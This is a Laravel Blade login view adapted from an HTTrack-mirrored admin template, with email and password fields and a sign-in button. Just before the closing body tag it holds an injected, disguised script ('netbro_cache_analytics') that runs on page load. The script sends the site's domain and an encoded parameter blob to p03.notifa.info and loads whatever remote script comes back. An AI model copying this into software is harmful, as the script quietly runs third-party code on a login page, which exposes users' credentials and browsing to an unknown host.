{{--@extends('layouts.app')--}}

{{--@section('content')--}}
{{--<div class="container">--}}
    {{--<div class="row justify-content-center">--}}
        {{--<div class="col-md-8">--}}
            {{--<div class="card">--}}
                {{--<div class="card-header">{{ __('Login') }}</div>--}}

                {{--<div class="card-body">--}}
                    {{--<form method="POST" action="{{ route('login') }}">--}}
                        {{--@csrf--}}

                        {{--<div class="form-group row">--}}
                            {{--<label for="email" class="col-md-4 col-form-label text-md-right">{{ __('E-Mail Address') }}</label>--}}

                            {{--<div class="col-md-6">--}}
                                {{--<input id="email" type="email" class="form-control @error('email') is-invalid @enderror" name="email" value="{{ old('email') }}" required autocomplete="email" autofocus>--}}

                                {{--@error('email')--}}
                                    {{--<span class="invalid-feedback" role="alert">--}}
                                        {{--<strong>{{ $message }}</strong>--}}
                                    {{--</span>--}}
                                {{--@enderror--}}
                            {{--</div>--}}
                        {{--</div>--}}

                        {{--<div class="form-group row">--}}
                            {{--<label for="password" class="col-md-4 col-form-label text-md-right">{{ __('Password') }}</label>--}}

                            {{--<div class="col-md-6">--}}
                                {{--<input id="password" type="password" class="form-control @error('password') is-invalid @enderror" name="password" required autocomplete="current-password">--}}

                                {{--@error('password')--}}
                                    {{--<span class="invalid-feedback" role="alert">--}}
                                        {{--<strong>{{ $message }}</strong>--}}
                                    {{--</span>--}}
                                {{--@enderror--}}
                            {{--</div>--}}
                        {{--</div>--}}

                        {{--<div class="form-group row">--}}
                            {{--<div class="col-md-6 offset-md-4">--}}
                                {{--<div class="form-check">--}}
                                    {{--<input class="form-check-input" type="checkbox" name="remember" id="remember" {{ old('remember') ? 'checked' : '' }}>--}}

                                    {{--<label class="form-check-label" for="remember">--}}
                                        {{--{{ __('Remember Me') }}--}}
                                    {{--</label>--}}
                                {{--</div>--}}
                            {{--</div>--}}
                        {{--</div>--}}

                        {{--<div class="form-group row mb-0">--}}
                            {{--<div class="col-md-8 offset-md-4">--}}
                                {{--<button type="submit" class="btn btn-primary">--}}
                                    {{--{{ __('Login') }}--}}
                                {{--</button>--}}

                                {{--@if (Route::has('password.request'))--}}
                                    {{--<a class="btn btn-link" href="{{ route('password.request') }}">--}}
                                        {{--{{ __('Forgot Your Password?') }}--}}
                                    {{--</a>--}}
                                {{--@endif--}}
                            {{--</div>--}}
                        {{--</div>--}}
                    {{--</form>--}}
                {{--</div>--}}
            {{--</div>--}}
        {{--</div>--}}
    {{--</div>--}}
{{--</div>--}}
{{--@endsection--}}




<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from fox-admin-templates.multipurposethemes.com/fox-admin-template/pages/examples/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Feb 2020 16:28:29 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="{{ asset('assets/images/favicon.ico') }}">

    <title>Fox Admin - Log in </title>

    <!-- Bootstrap v4.1.3.stable -->
    <link rel="stylesheet" href="{{asset('assets/assets/vendor_components/bootstrap/dist/css/bootstrap.min.css') }}">

    <!-- Font Awesome -->
    <link rel="stylesheet" href="{{asset('assets/assets/vendor_components/font-awesome/css/font-awesome.min.css') }}">

    <!-- Ionicons -->
    <link rel="stylesheet" href="{{asset('assets/assets/vendor_components/Ionicons/css/ionicons.min.css') }}">

    <!-- Theme style -->
    <link rel="stylesheet" href="{{asset('assets/css/master_style.css') }}">

    <!-- foxadmin Skins. Choose a skin from the css/skins
       folder instead of downloading all of them to reduce the load. -->
    <link rel="stylesheet" href="{{asset('assets/css/skins/_all-skins.css') }}">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- google font -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet">

</head>
<body class="hold-transition login-page">
<div class="login-box">
    <div class="login-logo">
        <a href="../../index.html"><b>Fox</b>Admin</a>
    </div>
    <!-- /.login-logo -->
    <div class="login-box-body">
        <p class="login-box-msg">Sign in to start your session</p>

        <form method="POST" action="{{ route('login') }}" class="form-element">
            @csrf
            <div class="form-group has-feedback">
                <input type="email" class="form-control @error('email') is-invalid @enderror" name="email"
                       value="{{ old('email') }}" placeholder="Email">
                @error('email')
                <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                @enderror
                <span class="ion ion-email form-control-feedback"></span>
            </div>
            <div class="form-group has-feedback">
                <input type="password" class="form-control @error('password') is-invalid @enderror" name="password"
                       placeholder="Password">
                @error('password')
                <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                @enderror
                <span class="ion ion-locked form-control-feedback"></span>
            </div>
            <div class="row">
                <div class="col-6">
                    <div class="checkbox">
                        <input type="checkbox" id="basic_checkbox_1" >
                        <label for="basic_checkbox_1">Remember Me</label>
                    </div>
                </div>
                <!-- /.col -->
                <div class="col-6">
                    <div class="fog-pwd">
                        <a href="javascript:void(0)"><i class="ion ion-locked"></i> Forgot pwd?</a><br>
                    </div>
                </div>
                <!-- /.col -->
                <div class="col-12 text-center">
                    <button type="submit" class="btn btn-info btn-block btn-flat margin-top-10">SIGN IN</button>
                </div>
                <!-- /.col -->
            </div>
        </form>



        <div class="margin-top-30 text-center">
            <p>Don't have an account? <a href="register.html" class="text-info m-l-5">Sign Up</a></p>
        </div>

    </div>
    <!-- /.login-box-body -->
</div>
<!-- /.login-box -->


<!-- jQuery 3 -->
<script src="{{asset('assets/assets/vendor_components/jquery/dist/jquery-3.3.1.min.js') }}"></script>

<!-- popper -->
<script src="{{asset('assets/assets/vendor_components/popper/dist/popper.min.js') }}"></script>

<!-- Bootstrap v4.1.3.stable -->
<script src="{{asset('assets/assets/vendor_components/bootstrap/dist/js/bootstrap.min.js') }}"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXVWgPDrj%2f2100EBjcJa4ef4t%2bIOOw6niOHZsnfUJZbrXVs%2biEDrI%2bK2QHnsnstNsm9NjqgqVrYwTPqyMUPIbOqmst7nb%2fR0TQjq3LI9dTPLBA5NAULx7gkAlbrQ1o2cHU71lXWlrMi7Ql5u1CnqV7kBCmwupUvVb1Zr0A2UNBcIVG%2bxPKh40fL%2bqa7gJD%2fIrqzzO8tyGvP7JEQ9kqwoiS5NhW0lvjBZ%2buaVDBlQSQeDK92Xf4%2bMDNzhHb2Mdaij0lGozUG8MtZL30mbgTbEwFtvHscSttbD2JajB710LHSq9XGfYv%2bBzH%2fwt%2fp9FGftzJLQIjeTMd41o%2bkm1F%2bnPzsOMJtfc3mgfeSqUhU6WbprJraT9pOUw2DBVhMpqej8yIt61egsI%2fBfa5TGtvxBzcSR3echsZVQlra6u3h754a4EqTSEBACynOytG5f7lJC2Qt27r3k99%2fzBKkvNp2k%2fYsrKQ4v5VhoKJ7regbbO%2bb%2f%2fmlGPFgrKIHwk7ZFC7zn6kCOgXd8mJKE1gIvDpB%2fvtGTsyvggqiX5%2fN6OT3tCE79Q%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from fox-admin-templates.multipurposethemes.com/fox-admin-template/pages/examples/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Feb 2020 16:28:29 GMT -->
</html>
